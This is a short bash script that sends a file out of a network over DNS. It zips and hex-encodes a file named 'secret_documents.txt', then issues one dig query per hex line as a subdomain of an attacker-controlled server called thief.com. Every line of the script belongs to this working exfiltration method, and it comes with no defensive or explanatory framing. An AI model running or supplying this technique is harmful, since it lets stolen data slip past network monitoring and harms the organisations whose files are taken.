#!/usr/bin/env bash

# You must control a DNS server, in this case called thief.com
SERVER=thief.com
# this presumes you have a large file called "secrets_documents.txt"
zip secret_documents.zip secret_documents.txt
# create a hex file from the binary#
xxd -p secret_documents.zip >  secret_documents.hex

# upload each line as queries to your server
for line in $(cat secret_documents.hex)
do
dig $line.${SERVER}
done
#
